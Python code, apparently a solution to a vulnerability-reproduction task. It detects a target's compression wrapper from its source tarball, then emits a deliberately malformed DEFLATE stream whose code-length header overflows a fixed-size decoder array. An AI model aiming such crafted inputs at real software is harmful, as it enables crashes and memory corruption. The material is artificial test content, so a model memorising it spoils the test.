import tarfile
from typing import Optional


class _BitWriter:
    __slots__ = ("buf", "bitpos")

    def __init__(self) -> None:
        self.buf = bytearray()
        self.bitpos = 0  # next bit position in current byte [0..7]

    def write(self, value: int, nbits: int) -> None:
        for i in range(nbits):
            if self.bitpos == 0:
                self.buf.append(0)
            if (value >> i) & 1:
                self.buf[-1] |= (1 << self.bitpos)
            self.bitpos = (self.bitpos + 1) & 7

    def finish(self) -> bytes:
        return bytes(self.buf)


class Solution:
    def _build_deflate_dynamic_empty_trigger(self) -> bytes:
        # Dynamic Huffman block:
        # - BFINAL=1, BTYPE=10
        # - HLIT=0 (257 lit/len codes)
        # - HDIST=0 (1 dist code)
        # - HCLEN=14 (18 code-length codes) -> overflows temp arrays sized 15
        # Code-length alphabet lengths: only symbols 1 and 18 have length 1; others 0.
        # Then encode 258 code lengths:
        #   256 zeros via 18(138) + 18(118)
        #   then two 1s (litlen[256]=1, dist[0]=1)
        # Data: EOB only.

        w = _BitWriter()
        w.write(1, 1)   # BFINAL
        w.write(2, 2)   # BTYPE=2 (dynamic)
        w.write(0, 5)   # HLIT
        w.write(0, 5)   # HDIST
        w.write(14, 4)  # HCLEN (18-4)

        # Code length code order (first 18 to include symbol 1; omit trailing 15)
        order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1]
        lengths = {1: 1, 18: 1}
        for sym in order:
            w.write(lengths.get(sym, 0), 3)

        # With lengths {1:1, 18:1}, canonical codes (len=1):
        # symbol 1 -> 0, symbol 18 -> 1 (bit order irrelevant for 1 bit)
        def cl_code_bit(sym: int) -> int:
            return 0 if sym == 1 else 1  # only sym 1 and 18 used

        # 18: repeat 0 for 138 => extra = 127 (7 bits)
        w.write(cl_code_bit(18), 1)
        w.write(127, 7)

        # 18: repeat 0 for 118 => extra = 107 (7 bits)
        w.write(cl_code_bit(18), 1)
        w.write(107, 7)

        # two literal lengths of 1
        w.write(cl_code_bit(1), 1)
        w.write(cl_code_bit(1), 1)

        # Compressed data: EOB. Literal/length tree has single symbol 256 with code 0 (1 bit).
        w.write(0, 1)

        return w.finish()

    def _detect_container(self, src_path: str) -> str:
        score_gzip = 0
        score_zlib = 0
        score_raw = 0

        def add_scores(name_l: str, data_l: bytes) -> None:
            nonlocal score_gzip, score_zlib, score_raw

            if "gzip" in name_l or "gunzip" in name_l or name_l.endswith(".gz"):
                score_gzip += 5
            if "zlib" in name_l or "adler" in name_l:
                score_zlib += 5
            if "deflate" in name_l or "inflate" in name_l:
                score_raw += 1

            if b"gzip" in data_l or b"gunzip" in data_l or b"gzopen" in data_l or b"gzread" in data_l:
                score_gzip += 4
            if b"adler" in data_l or b"zlib" in data_l or b"rfc1950" in data_l:
                score_zlib += 4

            # Heuristics: explicit gzip magic checks are strong indicators
            if b"0x1f" in data_l and b"0x8b" in data_l:
                score_gzip += 6
            if b"1f8b" in data_l or b"1f 8b" in data_l:
                score_gzip += 3
            if b"id1" in data_l and b"id2" in data_l and b"mtime" in data_l and b"xfl" in data_l:
                score_gzip += 6

            # Heuristics: zlib header checks
            if b"cmf" in data_l and b"flg" in data_l:
                score_zlib += 4
            if b"fdict" in data_l or b"31" in data_l and b"% 31" in data_l:
                score_zlib += 2
            if b"0x78" in data_l and (b"cmf" in data_l or b"flg" in data_l):
                score_zlib += 3

            # If there's evidence of expecting raw deflate (no wrapper)
            if b"raw deflate" in data_l or b"raw inflate" in data_l:
                score_raw += 10

        try:
            with tarfile.open(src_path, "r:*") as tf:
                total_read = 0
                for m in tf:
                    if not m.isfile():
                        continue
                    name_l = (m.name or "").lower()
                    if not any(name_l.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".inc", ".txt", "makefile")):
                        continue
                    if m.size <= 0:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    chunk = f.read(200_000)
                    total_read += len(chunk)
                    data_l = chunk.lower()
                    add_scores(name_l, data_l)
                    if total_read > 5_000_000:
                        break
        except Exception:
            return "gzip"

        # Prefer explicit wrapper checks; default to gzip if ambiguous
        if score_gzip >= max(score_zlib, score_raw) and score_gzip > 0:
            return "gzip"
        if score_zlib >= score_raw and score_zlib > 0:
            return "zlib"
        if score_raw > 0:
            return "raw"
        return "gzip"

    def solve(self, src_path: str) -> bytes:
        container = self._detect_container(src_path)
        deflate = self._build_deflate_dynamic_empty_trigger()

        if container == "raw":
            return deflate

        if container == "zlib":
            # zlib header (CMF/FLG) + deflate + Adler32(empty)=1
            return b"\x78\x9c" + deflate + b"\x00\x00\x00\x01"

        # gzip header + deflate + CRC32(empty)=0 + ISIZE=0
        gzip_header = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff"
        gzip_footer = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        return gzip_header + deflate + gzip_footer